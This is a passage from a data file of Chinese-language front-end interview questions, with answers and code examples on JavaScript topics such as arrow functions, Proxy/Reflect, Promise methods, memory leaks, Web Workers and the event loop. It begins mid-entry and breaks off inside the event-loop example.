                detailedAnswer: '箭头函数（=>）与普通函数的区别：\n1. this：箭头函数没有自己的 this，继承外层词法作用域的 this，且不可被 call/apply/bind 改变；普通函数 this 由调用方式决定\n2. arguments：箭头函数没有 arguments，需用剩余参数 ...args；普通函数有\n3. 构造函数：箭头函数不能 new（无 [[Construct]]），会抛 TypeError；普通函数可 new\n4. prototype：箭头函数没有 prototype 属性\n5. super/new.target：箭头函数没有，继承外层\n6. 语法：箭头函数更简洁，单表达式可省略 return 和 {}\n\n为什么不能 new：箭头函数设计目的是"函数即值"的回调场景，不设计 [[Construct]] 内部方法，new 时找不到该方法抛错。\n\n使用建议：\n- 适合：回调（map/filter/setTimeout）、需要外层 this 的场景\n- 不适合：对象方法（this 不会指向对象）、构造函数、原型方法、需要 arguments 的场景',
                codeExample: `// 箭头函数继承 this（解决回调 this 丢失）
function Timer() {
  this.count = 0;
  setInterval(() => {
    this.count++; // this 指向 Timer 实例（继承外层）
  }, 1000);
}
// 普通函数会丢失 this
function TimerBad() {
  this.count = 0;
  setInterval(function () {
    this.count++; // this 指向 window/undefined（错误）
  }, 1000);
}

// 不适合对象方法
const obj = {
  name: 'Alice',
  greet: () => console.log(this.name), // this 指向外层（window），不是 obj
};
obj.greet(); // undefined`,
                difficulty: 'medium',
                tags: ['箭头函数', 'this', 'arguments', '构造函数'],
                keyPoints: ['无自己的 this/arguments', '继承外层 this', '不能 new', '不适合对象方法'],
              },
              {
                id: 'javascript-set-map',
                domain: 'javascript',
                question: 'Set 和 Map 的特点是什么？与 WeakSet/WeakMap 有何区别？',
                shortAnswer: 'Set 是唯一值集合，Map 是键值对集合（键可为任意类型）。WeakSet/WeakMap 只接受对象、弱引用、不可遍历。WeakMap 常用于私有数据、缓存、DOM 关联，避免内存泄漏。',
                detailedAnswer: 'Set：值的集合，值唯一（用 SameValueZero 比较），有序（插入顺序）。常用：数组去重、集合运算（交并差）。\n\nMap：键值对集合，键可为任意类型（包括对象），键唯一，有序。比 Object 优势：键类型灵活、size 直接获取、遍历顺序确定、性能在频繁增删时更好。\n\nWeakSet：\n1. 只能存对象（不可存原始值）\n2. 弱引用：不影响 GC，对象无其他引用时会被回收并从 WeakSet 移除\n3. 不可遍历（无 size/forEach）\n4. 方法：add/delete/has\n\nWeakMap：\n1. 键只能是对象（值任意）\n2. 弱引用键，键被回收时值自动清理\n3. 不可遍历\n4. 方法：set/get/delete/has\n\n应用场景：\n- WeakMap：为对象添加私有数据（不污染原对象）、DOM 节点关联数据、缓存（自动清理）\n- WeakSet：标记对象状态（如"已访问"）',
                codeExample: `// Set 去重
const arr = [1, 2, 2, 3, 3, 3];
const unique = [...new Set(arr)]; // [1, 2, 3]

// Map 键可为对象
const m = new Map();
const key = {};
m.set(key, 'data');
m.get(key); // 'data'

// WeakMap 私有数据 + 自动清理
const privateData = new WeakMap();
class Person {
  constructor(name) {
    privateData.set(this, { name }); // 私有，外部无法访问
  }
  getName() { return privateData.get(this).name; }
}
// 实例被回收时，私有数据自动清理，无内存泄漏`,
                difficulty: 'medium',
                tags: ['Set', 'Map', 'WeakMap', 'WeakSet'],
                keyPoints: ['Set 唯一值', 'Map 任意键', 'WeakMap 弱引用键', 'WeakMap 不可遍历'],
              },
              {
                id: 'javascript-proxy-reflect',
                domain: 'javascript',
                question: 'Proxy 和 Reflect 的作用是什么？Proxy 能拦截哪些操作？',
                shortAnswer: 'Proxy 代理对象，拦截 get/set/has/deleteProperty/ownKeys/construct 等 13 种操作。Reflect 提供与拦截器同名的方法，用于在拦截器中调用默认行为。Vue3 用 Proxy 实现响应式。',
                detailedAnswer: 'Proxy：在目标对象前架设一层"拦截"，外界访问都经过这层处理。可拦截的操作（13 种 trap）：\n1. get/set：属性读取/设置\n2. has：in 操作符\n3. deleteProperty：delete 操作符\n4. ownKeys：Object.keys/Reflect.ownKeys\n5. getOwnPropertyDescriptor：Object.getOwnPropertyDescriptor\n6. defineProperty：Object.defineProperty\n7. preventExtensions/isExtensible：扩展性\n8. getPrototypeOf/setPrototypeOf：原型\n9. apply：函数调用（目标为函数）\n10. construct：new 操作（目标为函数）\n\nReflect：提供与 Proxy trap 同名的静态方法，目的：\n1. 将 Object 上的部分方法转移到 Reflect（如 Reflect.defineProperty）\n2. 让拦截器内能方便调用"默认行为"：Reflect.get(target, key, receiver)\n3. 部分方法返回布尔值而非抛错（如 Reflect.set 返回 true/false）\n\nVue3 响应式原理：用 Proxy 拦截 get（依赖收集）和 set（触发更新），比 Vue2 的 Object.defineProperty 优势：能监听新增属性、数组索引、性能更好。',
                codeExample: `// 响应式简化版
function reactive(obj) {
  return new Proxy(obj, {
    get(target, key, receiver) {
      track(target, key); // 依赖收集
      return Reflect.get(target, key, receiver);
    },
    set(target, key, value, receiver) {
      const result = Reflect.set(target, key, value, receiver);
      trigger(target, key); // 触发更新
      return result;
    },
  });
}

// 校验拦截
const validator = new Proxy({}, {
  set(target, key, value) {
    if (key === 'age' && (value < 0 || value > 150)) {
      throw new RangeError('年龄非法');
    }
    return Reflect.set(target, key, value);
  },
});`,
                difficulty: 'hard',
                tags: ['Proxy', 'Reflect', '响应式', 'Vue3'],
                keyPoints: ['Proxy 13 种 trap', 'Reflect 调用默认行为', 'Vue3 用 Proxy', '比 defineProperty 强'],
              },
              {
                id: 'javascript-symbol',
                domain: 'javascript',
                question: 'Symbol 的作用是什么？内置 Symbol 有哪些用途？',
                shortAnswer: 'Symbol 是 ES6 引入的原始类型，每个值唯一不可变，主要用于对象私有属性键（避免冲突）和定义内置行为（Symbol.iterator/hasInstance/toPrimitive 等）。',
                detailedAnswer: 'Symbol 是 ES6 引入的第 7 种原始类型，特点：\n1. 唯一性：Symbol() 每次返回不同值，即使描述相同\n2. 不可变性：不能与其他类型运算（会抛错或隐式转字符串）\n3. 不可枚举：for...in/Object.keys 不会遍历到 Symbol 键（需 Object.getOwnPropertySymbols）\n4. 可共享：Symbol.for("key") 在全局注册，相同 key 返回同一 Symbol\n\n用途：\n1. 私有属性：避免第三方库属性冲突\n2. 内置 Symbol：定义对象的底层行为\n\n常用内置 Symbol：\n- Symbol.iterator：定义 for...of 展开运算符的迭代行为\n- Symbol.hasInstance：instanceof 的判断逻辑\n- Symbol.toPrimitive：对象转原始值的行为\n- Symbol.toStringTag：Object.prototype.toString 的类型标签\n- Symbol.asyncIterator：定义 for await...of 异步迭代\n- Symbol.isConcatSpreadable：数组 concat 是否展开',
                codeExample: `// 私有属性（避免冲突）
const PRIV = Symbol('private');
class Foo {
  [PRIV] = 'secret';
  getSecret() { return this[PRIV]; }
}

// 自定义迭代
class Range {
  constructor(start, end) { this.start = start; this.end = end; }
  [Symbol.iterator]() {
    let cur = this.start, end = this.end;
    return {
      next() {
        return cur <= end
          ? { value: cur++, done: false }
          : { done: true };
      }
    };
  }
}
[...new Range(1, 3)]; // [1, 2, 3]

// 自定义 instanceof
class Even {
  static [Symbol.hasInstance](x) { return x % 2 === 0; }
}
2 instanceof Even; // true`,
                difficulty: 'medium',
                tags: ['Symbol', '迭代器', '私有属性'],
                keyPoints: ['Symbol 唯一不可变', '私有属性键', '内置 Symbol 定义行为', 'Symbol.for 全局共享'],
              },
              {
                id: 'javascript-iterator-generator',
                domain: 'javascript',
                question: 'Iterator 和 Generator 是什么？它们的关系是什么？',
                shortAnswer: 'Iterator 是迭代器协议（next() 返回 {value, done}）；Generator 是生成迭代器的函数（function* + yield）。Generator 是 Iterator 的语法糖，自动实现 next 方法，可暂停执行。',
                detailedAnswer: 'Iterator（迭代器）协议：\n- 对象实现 next() 方法，返回 { value, done }\n- 可迭代协议：对象实现 [Symbol.iterator]() 返回迭代器\n- for...of、展开运算符、解构等都依赖此协议\n\nGenerator（生成器）：\n- 用 function* 声明，内部用 yield 暂停并产出值\n- 调用生成器函数返回一个迭代器（同时也是可迭代对象）\n- 每次 next() 执行到下一个 yield 暂停，yield 后表达式为 value\n- next(args) 可向生成器内传值（作为上一个 yield 的返回值）\n- throw(err) 可向生成器内抛错\n\n关系：Generator 是创建 Iterator 的语法糖，无需手写 next 方法。\n\n应用场景：\n1. 自定义可迭代数据结构\n2. 惰性计算（按需生成，省内存）\n3. 状态机\n4. 异步流程控制（async/await 前的方案，如 co 库）',
                codeExample: `// 手写 Iterator
function makeIterator(arr) {
  let i = 0;
  return {
    next() {
      return i < arr.length
        ? { value: arr[i++], done: false }
        : { value: undefined, done: true };
    },
    [Symbol.iterator]() { return this; }
  };
}

// Generator 简化
function* gen(arr) {
  for (const x of arr) yield x;
}
const it = gen([1, 2, 3]);
it.next(); // { value: 1, done: false }
it.next(); // { value: 2, done: false }
it.next(); // { value: 3, done: false }
it.next(); // { value: undefined, done: true }

// 惰性无限序列
function* naturals() { let n = 1; while (true) yield n++; }
const nums = naturals();
nums.next().value; // 1
nums.next().value; // 2`,
                difficulty: 'hard',
                tags: ['Iterator', 'Generator', '迭代器', 'yield'],
                keyPoints: ['Iterator 的 next 协议', 'Generator 是语法糖', 'yield 暂停执行', '可惰性计算'],
              },
              {
                id: 'javascript-promise-methods',
                domain: 'javascript',
                question: 'Promise.all/race/allSettled/any 的区别？各自的应用场景？',
                shortAnswer: 'all：全成功才成功，一个失败即失败（全部完成）；race：第一个完成（成功或失败）即定；allSettled：全完成才完成（永远不 reject）；any：第一个成功即成功（全失败才失败）。分别用于并行等待、超时控制、批量不中断、容错取一。',
                detailedAnswer: 'Promise 静态方法对比：\n1. Promise.all([p1, p2, ...])\n   - 全部 fulfilled 才 fulfilled（结果数组按顺序）\n   - 任一 reject 立即 reject（短路，其他仍执行但结果被忽略）\n   - 场景：并行加载多个资源全部完成才继续\n\n2. Promise.race([p1, p2, ...])\n   - 第一个 settle（fulfilled 或 rejected）即定，结果采用第一个\n   - 场景：超时控制（Promise.race([fetch(url), timeout(3000)])）、多源竞速\n\n3. Promise.allSettled([p1, p2, ...])\n   - 全部 settle 才完成，永不 reject\n   - 结果：[{ status: "fulfilled", value }, { status: "rejected", reason }]\n   - 场景：批量请求不希望一个失败导致整体失败，需知道每个结果\n\n4. Promise.any([p1, p2, ...])\n   - 第一个 fulfilled 即 fulfilled（短路）\n   - 全部 reject 才 reject（AggregateError）\n   - 场景：多源容错，任一可用即可（如多 CDN 取最快）',
                codeExample: `// Promise.all：全部成功
Promise.all([fetch('/a'), fetch('/b')])
  .then(([a, b]) => { /* 都成功 */ })
  .catch(err => { /* 任一失败 */ });

// 超时控制
function withTimeout(promise, ms) {
  return Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error('timeout')), ms))
  ]);
}

// 批量不中断
Promise.allSettled(urls.map(fetch))
  .then(results => {
    results.forEach(r => {
      if (r.status === 'fulfilled') console.log(r.value);
      else console.error(r.reason);
    });
  });

// 多源容错
Promise.any([fetch(cdn1), fetch(cdn2), fetch(cdn3)])
  .then(first => { /* 第一个成功的 */ });`,
                difficulty: 'medium',
                tags: ['Promise', 'Promise.all', 'Promise.race', '并行'],
                keyPoints: ['all 全成功', 'race 第一个定', 'allSettled 永不 reject', 'any 第一个成功'],
              },
              {
                id: 'javascript-memory-leak',
                domain: 'javascript',
                question: '前端常见的内存泄漏场景有哪些？如何排查和避免？',
                shortAnswer: '常见场景：意外全局变量、未清除定时器/监听、闭包持有大对象、脱离 DOM 引用、缓存无上限、WebSocket 未关闭。排查用 Chrome Memory 面板（Heap Snapshot 三次对比）。避免：及时清理、用 WeakMap、限长缓存。',
                detailedAnswer: '前端内存泄漏常见场景：\n1. 意外全局变量：未用 let/var/const 声明（如函数内直接 foo = 1），挂到 window 永不释放\n2. 未清除的定时器：setInterval/setTimeout 持有闭包引用，组件销毁后仍执行\n3. 未移除事件监听：addEventListener 后未 removeEventListener（尤其 window/document 上的）\n4. 闭包持有大对象：闭包引用不再需要的大数组/对象，阻止 GC\n5. 脱离 DOM 的引用：变量持有已 removeChild 的 DOM 节点，节点及其引用链无法回收\n6. 缓存无上限：Map/Set 缓存只增不减\n7. WebSocket/EventSource 未关闭\n8. console.log 大对象（DevTools 持有引用）\n9. 循环引用（旧 IE 引用计数问题，现代浏览器标记清除已解决）\n\n排查方法：\n1. Chrome DevTools Memory 面板\n   - Heap Snapshot：拍三张快照（操作前、操作后、再次操作后），对比增量\n   - Allocation Timeline：记录分配时间线，定位分配热点\n   - Detached DOM nodes：过滤"已脱离 DOM"节点\n2. Performance Monitor：监控 JS heap size 曲线是否持续上涨\n3. Performance 面板：录制内存时间线\n\n避免策略：\n- 组件销毁时清理：clearInterval、removeEventListener、关闭连接\n- 用 WeakMap/WeakSet 存对象关联数据（自动随对象回收）\n- 缓存设上限（LRU）\n- 避免闭包持有不必要的大对象',
                codeExample: `// 1. 定时器泄漏
useEffect(() => {
  const timer = setInterval(() => { /* ... */ }, 1000);
  return () => clearInterval(timer); // 清理！
}, []);

// 2. 监听泄漏
useEffect(() => {
  const handler = () => { /* ... */ };
  window.addEventListener('resize', handler);
  return () => window.removeEventListener('resize', handler);
}, []);

// 3. 用 WeakMap 关联 DOM 数据（自动清理）
const data = new WeakMap();
const el = document.getElementById('x');
data.set(el, { big: 'data' });
el.remove(); // el 被回收后，data 中的条目自动消失

// 4. LRU 缓存限长
class LRU {
  constructor(max) { this.max = max; this.cache = new Map(); }
  get(k) { const v = this.cache.get(k); if (v) { this.cache.delete(k); this.cache.set(k, v); } return v; }
  set(k, v) { if (this.cache.has(k)) this.cache.delete(k); this.cache.set(k, v); if (this.cache.size > this.max) this.cache.delete(this.cache.keys().next().value); }
}`,
                difficulty: 'hard',
                tags: ['内存泄漏', '性能', 'Chrome DevTools', 'WeakMap'],
                keyPoints: ['定时器/监听未清理', '闭包持大对象', '脱离 DOM 引用', 'WeakMap 自动清理'],
              },
              {
                id: 'javascript-event-delegation',
                domain: 'javascript',
                question: '什么是事件委托（事件代理）？它的原理和优缺点？',
                shortAnswer: '事件委托利用事件冒泡，把子元素的事件监听绑定到共同父元素上，通过 event.target 判断实际触发元素。优点：减少监听数、动态元素自动生效。缺点：不适用不冒泡事件、需过滤非目标元素。',
                detailedAnswer: '事件委托（Event Delegation）原理：\n利用事件冒泡机制，不在每个子元素上绑定监听，而是在共同祖先（如 ul）上绑定，事件触发时通过 event.target 判断实际源元素。\n\n事件流三阶段：捕获（从 window 向下）→ 目标 → 冒泡（从目标向上）。事件委托主要利用冒泡阶段。\n\n优点：\n1. 减少监听器数量，节省内存（1000 个 li 只需 1 个监听）\n2. 动态添加的子元素自动生效，无需重新绑定\n3. 适合大量相似元素（如表格行、列表项）\n\n缺点/限制：\n1. 不适用不冒泡的事件（blur/focus、mouseenter/mouseleave 需用对应冒泡版 focusin/mouseover）\n2. 需手动过滤非目标元素（如点 li 内的 span 需 closest 查找）\n3. 委托层级过深可能影响性能（冒泡路径长）\n4. 某些场景需 stopPropagation 避免冲突\n\n应用：列表点击、表格行操作、动态列表、键盘快捷键（绑 document）',
                codeExample: `// 传统：每个 li 绑定
document.querySelectorAll('li').forEach(li => {
  li.addEventListener('click', () => { /* ... */ });
});

// 事件委托：在 ul 绑定
document.querySelector('ul').addEventListener('click', (e) => {
  const li = e.target.closest('li');
  if (!li) return; // 点到 ul 非 li 区域
  const id = li.dataset.id;
  console.log('点击了', id);
});

// 动态添加的 li 自动生效
ul.appendChild(newLi); // 无需重新绑定

// 键盘快捷键委托到 document
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeDialog();
});`,
                difficulty: 'easy',
                tags: ['事件委托', '事件冒泡', '性能'],
                keyPoints: ['利用事件冒泡', '减少监听器数量', '动态元素自动生效', '不适用不冒泡事件'],
              },
              {
                id: 'javascript-currying',
                domain: 'javascript',
                question: '什么是函数柯里化（Currying）？如何实现？有什么应用？',
                shortAnswer: '柯里化把接受多参数的函数转成一系列接受单参数的函数。实现：递归收集参数，参数足够时执行。应用：参数复用、延迟执行、函数组合。add(1)(2)(3) 即柯里化调用。',
                detailedAnswer: '函数柯里化（Currying）：把 f(a, b, c) 转换成 f(a)(b)(c)，每次只接收一个参数，返回新函数等待下一个参数，直到参数齐备才执行。\n\n实现原理：\n1. 用闭包收集已传参数\n2. 返回新函数继续接收剩余参数\n3. 判断参数总数是否达到原函数期望数量\n4. 达到则执行，否则继续返回柯里化函数\n\n应用场景：\n1. 参数复用：const add5 = add(5); add5(3) // 8\n2. 延迟执行：在数据齐备前缓存\n3. 函数组合：与 pipe/compose 配合\n4. 部分应用：固定部分参数生成新函数\n5. 提前确认：第一次调用时确定环境（如事件绑定兼容检测）\n\n与偏函数（Partial Application）区别：\n- 柯里化：每次只传一个参数\n- 偏函数：可一次传多个参数（bind 是偏函数）',
                codeExample: `// 通用柯里化
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args); // 参数齐备，执行
    }
    return function (...rest) {
      return curried.apply(this, [...args, ...rest]); // 继续收集
    };
  };
}

const add = (a, b, c) => a + b + c;
const cAdd = curry(add);
cAdd(1)(2)(3);    // 6
cAdd(1, 2)(3);    // 6
cAdd(1)(2, 3);    // 6

// 参数复用
const log = curry((level, time, msg) => \`\${level} \${time} \${msg}\`);
const errorLog = log('ERROR'); // 固定 level
errorLog('10:00', 'fail');     // 'ERROR 10:00 fail'`,
                difficulty: 'medium',
                tags: ['柯里化', '函数式编程', '闭包', '手写题'],
                keyPoints: ['多参转单参链', '闭包收集参数', '参数复用', '与偏函数区别'],
              },
              {
                id: 'javascript-iife-module',
                domain: 'javascript',
                question: 'IIFE（立即执行函数）的作用是什么？为什么曾经用于模块化？',
                shortAnswer: 'IIFE 是定义后立即执行的函数，作用：创建独立作用域避免污染全局、模拟块级作用域（ES5 前）、实现模块模式（私有成员）。ES6 前 ES5 无块级作用域，IIFE 是模块化的主要手段。',
                detailedAnswer: 'IIFE（Immediately Invoked Function Expression）形式：(function(){ ... })() 或 (function(){ ... }())。\n\n作用：\n1. 创建独立函数作用域：内部变量不污染全局\n2. 模拟块级作用域：ES5 没有块级作用域（{} 内 var 仍泄漏），IIFE 提供隔离\n3. 模块模式：结合闭包实现私有成员和公共接口\n4. 避免变量提升冲突\n5. 初始化代码只执行一次\n\n为什么 ES6 前用 IIFE 做模块化：\n- ES5 只有全局作用域和函数作用域，没有模块系统\n- IIFE 创建独立作用域 + 闭包封装私有变量\n- 通过返回值或挂到全局暴露公共接口\n- 代表：jQuery 的 $(function(){})、UMD 规范、RequireJS 的封装\n\nES6 后：let/const 块级作用域 + ES Module 取代了 IIFE 的大部分场景，但 IIFE 仍用于：\n- 一次性初始化\n- 避免临时变量污染\n- UMD/老库兼容\n- for 循环中保存变量值（var 时代解决方案）',
                codeExample: `// 1. 隔离作用域
(function () {
  var local = '不会污染全局';
  console.log(local);
})();
// console.log(local); // ReferenceError

// 2. 模块模式（私有 + 公共）
const Counter = (function () {
  let count = 0; // 私有
  return {
    inc() { count++; },
    get() { return count; },
  };
})();
Counter.inc();
Counter.get(); // 1
// Counter.count // undefined（私有）

// 3. for + var 的经典问题解决
for (var i = 0; i < 3; i++) {
  (function (j) {
    setTimeout(() => console.log(j), 0); // 0,1,2
  })(i);
}
// ES6 直接用 let 即可
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // 0,1,2
}`,
                difficulty: 'easy',
                tags: ['IIFE', '模块模式', '作用域', '闭包'],
                keyPoints: ['创建独立作用域', 'ES6 前模块化手段', '模块模式实现私有', 'for+var 经典解法'],
              },
              {
                id: 'javascript-requestanimationframe',
                domain: 'javascript',
                question: 'requestAnimationFrame 与 setTimeout/setInterval 的区别？为什么动画要用 rAF？',
                shortAnswer: 'rAF 在浏览器下一次重绘前调用，频率跟随刷新率（通常 60fps），且页面不可见时自动暂停。setTimeout 固定间隔可能丢帧/抖动。动画用 rAF 更流畅、省电、不后台空跑。',
                detailedAnswer: '三者区别：\n1. setTimeout(fn, delay)：固定延迟后执行一次，不与渲染同步，可能丢帧或抖动\n2. setInterval(fn, interval)：固定间隔执行，不与渲染同步，可能堆积（前次未完成下次已到）\n3. requestAnimationFrame(fn)：在浏览器下一次重绘前调用，频率匹配显示器刷新率（通常 60Hz≈16.67ms）\n\nrAF 优势：\n1. 与渲染同步：在每一帧渲染前执行，确保动画流畅不丢帧\n2. 自动匹配刷新率：60Hz/120Hz/144Hz 自适应，无需手动算间隔\n3. 后台暂停：页面不可见（切换标签页）时自动暂停，省电省 CPU\n4. 浏览器优化：与 CSS 动画同等优先级，资源紧张时智能跳帧\n\nsetTimeout 做动画的问题：\n1. 间隔不准：JS 单线程，setTimeout 至少 4ms，被其他任务阻塞会延迟\n2. 不与渲染同步：可能在帧中间触发，导致掉帧或重复绘制\n3. 后台仍执行：标签页不可见时仍跑（节流到 1s 但仍消耗）\n4. 帧率不匹配：固定 16ms 在 120Hz 屏幕上会显得卡\n\n取消：clearTimeout / clearInterval / cancelAnimationFrame。',
                codeExample: `// 动画用 rAF（推荐）
function animate() {
  // 更新 DOM
  element.style.left = (pos += 2) + 'px';
  if (pos < 300) requestAnimationFrame(animate);
}
requestAnimationFrame(animate);

// setTimeout 动画（不推荐，会抖动）
function animateBad() {
  element.style.left = (pos += 2) + 'px';
  if (pos < 300) setTimeout(animateBad, 16);
}

// 节流：rAF 版
function rafThrottle(fn) {
  let scheduled = false;
  return (...args) => {
    if (scheduled) return;
    scheduled = true;
    requestAnimationFrame(() => {
      scheduled = false;
      fn(...args);
    });
  };
}`,
                difficulty: 'medium',
                tags: ['requestAnimationFrame', '动画', '渲染', '性能'],
                keyPoints: ['rAF 与渲染同步', '匹配刷新率', '后台自动暂停', '动画首选 rAF'],
              },
              {
                id: 'javascript-web-worker',
                domain: 'javascript',
                question: 'Web Worker 是什么？什么场景下使用？有哪些限制？',
                shortAnswer: 'Web Worker 允许在后台线程运行 JS，避免阻塞主线程。适用于 CPU 密集计算（大数据处理、图像处理、加密）。限制：不能访问 DOM/window、与主线程通信靠 postMessage、同源限制、不能直接共享内存（SharedArrayBuffer 除外）。',
                detailedAnswer: 'Web Worker：HTML5 提供的多线程方案，让 JS 在后台线程运行，不阻塞 UI。\n\n类型：\n1. Dedicated Worker（专用 Worker）：一个 Worker 只被创建它的页面使用\n2. Shared Worker（共享 Worker）：可被多个同源页面共享\n3. Service Worker：独立于页面，用作网络代理（离线缓存、推送）\n\n适用场景：\n1. CPU 密集计算：大数据处理、排序、加密、压缩\n2. 图像/视频处理：滤镜、编码\n3. 复杂数学运算：物理引擎、3D 计算\n4. 长任务分片：避免主线程长任务（>50ms）卡 UI\n\n限制：\n1. 不能访问 DOM/window/document（无法操作 UI）\n2. 不能访问 localStorage（SharedWorker 除外）/ 部分 window API\n3. 与主线程通信靠 postMessage（结构化克隆，序列化开销）\n4. 同源策略限制（脚本需同源，或用 blob URL/importScripts）\n5. 启动有开销（创建线程、加载脚本），短任务不划算\n6. 不能直接共享内存（除非用 SharedArrayBuffer + Atomics）\n\n通信：\n- 主线程→Worker：worker.postMessage(data)\n- Worker→主线程：self.postMessage(data)\n- 数据通过结构化克隆传递（对象深拷贝），Transferable 对象可转移所有权（零拷贝）',
                codeExample: `// main.js
const worker = new Worker('worker.js');
worker.postMessage({ data: bigArray });
worker.onmessage = (e) => {
  console.log('结果：', e.data);
};

// worker.js
self.onmessage = (e) => {
  const result = heavyCompute(e.data.data);
  self.postMessage(result);
};

// Transferable 零拷贝（ArrayBuffer）
const buffer = new ArrayBuffer(1024);
worker.postMessage(buffer, [buffer]); // 转移所有权，main 失去访问

// 内联 Worker（blob URL，绕过同源）
const code = \`self.onmessage = e => self.postMessage(e.data * 2)\`;
const blob = new Blob([code], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));`,
                difficulty: 'hard',
                tags: ['Web Worker', '多线程', '性能', 'postMessage'],
                keyPoints: ['后台线程不阻塞 UI', '不能访问 DOM', 'postMessage 通信', 'CPU 密集场景'],
              },
              {
                id: 'javascript-lazy-function',
                domain: 'javascript',
                question: '什么是惰性函数（Lazy Function）？它和函数柯里化、偏函数有什么区别？',
                shortAnswer: '惰性函数第一次执行时根据环境重写自身，后续调用直接走确定逻辑，避免重复判断。常用于兼容性检测（addEventListener vs attachEvent）。柯里化是参数拆分，偏函数是固定部分参数，惰性函数是首次执行后定型。',
                detailedAnswer: '惰性函数（Lazy Function Definition）：函数第一次被调用时，根据运行环境/条件重写自身，后续调用直接使用重写后的版本，避免每次都执行相同的判断逻辑。\n\n核心思想：把"每次都要判断"变成"只判断一次"。\n\n经典应用：浏览器兼容性检测\n- addEventListener vs attachEvent\n- XMLHttpRequest vs ActiveXObject\n- requestAnimationFrame 的 polyfill\n\n实现方式：\n1. 第一次调用时执行检测，然后用新函数覆盖旧函数（函数本身是变量）\n2. 后续调用直接走确定分支\n\n与其他概念区别：\n1. 惰性函数：首次执行后定型，避免重复判断（关注执行时机）\n2. 函数柯里化：f(a,b,c) → f(a)(b)(c)，拆分参数（关注参数形式）\n3. 偏函数：固定部分参数生成新函数 bind/fn.partial（关注参数预设）\n4. 记忆化（Memoization）：缓存计算结果，相同输入直接返回缓存（关注结果缓存）\n\n适用场景：\n- 兼容性检测（只检测一次）\n- 环境探测（如是否支持某 API）\n- 单例模式（首次创建后返回同一实例）',
                codeExample: `// 惰性函数：兼容性事件绑定
function addEvent(elem, type, handler) {
  if (window.addEventListener) {
    // 重写自身
    addEvent = function (elem, type, handler) {
      elem.addEventListener(type, handler, false);
    };
  } else if (window.attachEvent) {
    addEvent = function (elem, type, handler) {
      elem.attachEvent('on' + type, handler);
    };
  } else {
    addEvent = function (elem, type, handler) {
      elem['on' + type] = handler;
    };
  }
  addEvent(elem, type, handler); // 首次也要执行
}

// 对比：每次都判断（低效）
function addEventBad(elem, type, handler) {
  if (window.addEventListener) elem.addEventListener(type, handler, false);
  else if (window.attachEvent) elem.attachEvent('on' + type, handler);
  // 1 万次调用 = 1 万次 if 判断
}`,
                difficulty: 'medium',
                tags: ['惰性函数', '函数式', '兼容性', '手写题'],
                keyPoints: ['首次执行后重写自身', '避免重复判断', '兼容性检测常用', '区别于柯里化/偏函数'],
              },
              {
                id: 'javascript-object-create',
                domain: 'javascript',
                question: 'Object.create 的作用是什么？与 new 和字面量创建对象有何区别？',
                shortAnswer: 'Object.create(proto) 创建一个以 proto 为原型的新对象。区别：字面量 {} 原型是 Object.prototype；new Fn() 原型是 Fn.prototype 且执行构造函数；Object.create 可指定任意原型（含 null）且不执行构造函数。',
                detailedAnswer: '三种创建对象方式：\n1. 字面量 / new Object()：\n   - const obj = {}\n   - 原型固定为 Object.prototype\n   - 不执行构造函数\n\n2. new Fn()：\n   - 创建对象，原型设为 Fn.prototype\n   - 执行构造函数（绑定 this，初始化属性）\n   - 返回值若为对象则替代\n\n3. Object.create(proto, descriptors)：\n   - 创建对象，原型指定为 proto（可为任意对象或 null）\n   - 第二参数可选，定义属性描述符\n   - 不执行任何构造函数\n\nObject.create 用途：\n1. 实现原型链继承（寄生组合继承的核心）\n2. 创建无原型的纯净对象（Object.create(null)，用作字典/哈希表，无 toString 等干扰）\n3. 浅复制对象（Object.create(Object.getPrototypeOf(obj), Object.getOwnPropertyDescriptors(obj))）\n4. Object.setPrototypeOf 的替代（创建新对象而非修改已有）\n\n区别关键：\n- 字面量/new：原型固定\n- Object.create：原型可指定，包括 null\n- new：执行构造函数；Object.create：不执行',
                codeExample: `// 1. 字面量
const a = {};
Object.getPrototypeOf(a) === Object.prototype; // true

// 2. new
function Person(name) { this.name = name; }
Person.prototype.greet = function () { return 'hi ' + this.name; };
const b = new Person('Alice');
Object.getPrototypeOf(b) === Person.prototype; // true
b.greet(); // 'hi Alice'

// 3. Object.create
const proto = { greet() { return 'hi ' + this.name; } };
const c = Object.create(proto);
c.name = 'Bob';
c.greet(); // 'hi Bob'

// 纯净字典对象（无原型链干扰）
const dict = Object.create(null);
dict.toString; // undefined（无 Object.prototype）
dict[key] = value; // 安全，无原型污染

// 寄生组合继承核心
function inherit(Child, Parent) {
  Child.prototype = Object.create(Parent.prototype);
  Child.prototype.constructor = Child;
}`,
                difficulty: 'medium',
                tags: ['Object.create', '原型链', '继承', '对象创建'],
                keyPoints: ['指定任意原型', '可传 null 无原型', '不执行构造函数', '寄生组合继承核心'],
              },
              {
                id: 'javascript-event-loop-advanced',
                domain: 'javascript',
                question: '请分析以下代码的输出顺序：Promise、setTimeout、async/await、requestAnimationFrame 混合。',
                shortAnswer: '顺序：同步代码→微任务（Promise.then/await 后续）→requestAnimationFrame→渲染→宏任务（setTimeout）。关键：await 会交出控制权，await 后代码相当于 then 微任务；rAF 在渲染前、宏任务在渲染后。',
                detailedAnswer: '完整事件循环顺序（一帧内）：\n1. 执行一个宏任务（包括同步代码所在的初始任务）\n2. 清空所有微任务队列（Promise.then、queueMicrotask、await 后续、MutationObserver）\n3. 执行 requestAnimationFrame 回调\n4. 浏览器渲染（style/layout/paint）\n5. 回到第 1 步，取下一个宏任务（setTimeout 等）\n\n关键规则：\n1. async 函数遇到 await：暂停，交出控制权，等 Promise resolve 后，await 后续代码作为微任务入队\n2. Promise.then 的回调是微任务\n3. setTimeout 的回调是宏任务\n4. requestAnimationFrame 在微任务后、渲染前执行\n5. 每次宏任务执行后，清空所有微任务，再进入下一轮\n\n注意点：\n- await 等待的若是已 resolved 的 Promise，后续仍走微任务（不跳过）\n- 多个微任务按入队顺序执行\n- 同一宏任务内，微任务优先于 rAF 和 setTimeout',
                codeExample: `console.log('1: 同步');

setTimeout(() => console.log('6: 宏任务'), 0);

Promise.resolve().then(() => console.log('3: 微任务'));

requestAnimationFrame(() => console.log('5: rAF'));

async function async1() {
  console.log('2: async 同步部分');
  await Promise.resolve();
  console.log('4: await 后（微任务）');
}
async1();

console.log('7: 同步');

// 输出顺序：
// 1: 同步
